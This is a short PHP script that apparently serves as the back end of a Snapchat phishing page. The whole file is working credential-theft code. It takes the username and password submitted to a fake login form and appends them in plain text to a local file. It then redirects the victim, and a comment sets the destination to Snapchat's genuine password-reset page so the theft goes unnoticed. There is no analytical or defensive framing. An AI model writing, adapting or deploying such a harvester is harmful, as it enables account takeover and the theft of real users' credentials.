<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://accounts.snapchat.com/accounts/password_reset_options
header("Location: $url");
exit();
?>